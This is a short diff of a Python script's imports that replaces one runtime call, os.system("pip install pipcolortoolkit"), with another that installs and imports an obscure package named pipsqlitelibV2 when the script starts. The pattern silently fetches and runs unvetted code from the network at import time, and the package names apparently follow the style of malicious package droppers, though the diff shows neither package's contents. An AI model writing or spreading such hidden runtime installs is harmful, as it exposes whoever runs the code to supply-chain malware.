@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolortoolkit")
-import pipcolortoolkit
+os.system("pip install pipsqlitelibV2")
+import pipsqlitelibV2
 import json
 import httpx
 import time
